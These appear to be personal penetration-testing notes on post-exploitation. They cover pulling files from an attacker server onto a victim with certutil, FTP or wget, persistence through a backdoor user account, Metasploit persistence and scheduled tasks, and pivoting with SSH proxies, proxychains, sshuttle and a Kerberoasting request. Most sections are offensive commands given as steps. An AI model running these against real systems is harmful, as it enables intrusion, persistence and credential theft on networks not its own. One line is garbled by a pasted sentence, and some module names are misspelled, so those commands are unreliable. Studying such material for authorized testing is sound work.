# File transfer
==**One important thing is to transfer files between the victim and the attacker so we can use different tools**==

## Certutil
```bash
certutil.exe -urlcache -f http://IP/file
```


## HTTP python
```bash
python -m SimpleHTTPServer 80
```


In case the don't work we can use FTP

## FTP 
It works in linux and windows.

We can easily run on the attacker:
```bash
python -m pyftpdlib 21
```

On the victim we can run:
```bash
ftp IP
```

## Linux
In linux we can run `wget`

## Metasploit
We can also use the upload or download features of metasploit.



# Maintaining access

**==The idea is to maintain the access on the victim in order to have access in the next days.==**

<mark style="background: #BBFABBA6;">One of the most used strategy is to add a user.</mark>

## Add user
```bash
net user hacker password123 /add
```

In this case we are adding a user in Active Directory.


## Metasploit
**==We can use the persistant script in this way:==**
```bash
run persistance -h

use exploit/windows/local/persistance

## or in case

use exploit/windows/local/regiWe can use the persistant script in this way:stry_persistance
```
- we are opening a port in the machine but it is very very dangerous


In other hand we could run scheduled tasks:
```bash
run scheduleme

## or 
run schtaskabuse
```



# Pivoting 
==**Let's imagine we compromised a machine and this machine gives us access to two network interfaces.**==

Now imagine that these two interfaces share another one that was not accessible before to us.

**==So we use the first machine to compromise the one not directly accessible.==**

So what we can do is to setup a proxy


### Idea
we access in ssh to a machinwe we compromised:
- ![[Pasted image 20241221215410.png]]

So in this machine we can see two interfaces:
- ![[Pasted image 20241221215517.png]]

From our machine we ping `10.10.10.5` but we don't obtain any response.

So let's create a proxy and pivot to the new victim.

## Proxychain
So we start to cat the `conf` file of proxychain
```bash
cat /etc/proxychains4.conf
```
- here we can see:
- ![[Pasted image 20241221220151.png]]

This is what we need to use to blind the connection to the port 9050.

So what we do is to use ssh and to redirect th etraffic to the victim:
```bash
ssh -f -N -D PROXYCHAIN_PORT root@PIVOT_VICTIM_IP
```
- ![[Pasted image 20241221220309.png]]
- `-f` goes on background 
- `-N` means we don't want to execute remote commands
- `-D` this is to bind the connection to the port `9050`


At this point using `proxychains` we can run commands to reach the final victim:
```
proxychains nmap -p- FINAL_VICTIM_IP
```
- ![[Pasted image 20241221220544.png]]
- ![[Pasted image 20241221221221.png]]

Remember to use `-sT` because sometimes there are problems.

One useful command for hacking active directory is:
```bash
proxychains GetUserSPNs.py DOMAIN/username:PASSWORD -dc-ip 10.10.10.255 -request
```


We can also use firefox with the proxy:
```bash
proxychains firefox
```

## SSHUTTEL
Another tool is `sshuttle`

To install it we can use:
```bash
sudo pip install sshuttle
```

In this case we can connect using:
```bash
sshuttle -r username@VICTIM_IP FINAL_NETWORK_VICTIM --ssh-cmd "ssh -i identity_file"
```
- ![[Pasted image 20241221221927.png]]
-  trough the user on `10.10.155.5` we want to connect to the network `10.10.10.0/24` trough ssh with the identity file


In this case we can avoid to use proxychains in front every command and just type the command on the attacker machine:
- ![[Pasted image 20241221221911.png]]

## Chisel
Another tool we can use is chisel (find it on github).


# CLEAN UP
**==We have to make the victim clean and remove everything we have added or modified.==**

Make the system/network as it was when we entered:
- <mark style="background: #BBFABBA6;">remove executables, scripts, and files</mark>
- <mark style="background: #BBFABBA6;">remove malwares, rootkits and added user accounts</mark>
- <mark style="background: #BBFABBA6;">set settings back to original configuration</mark>

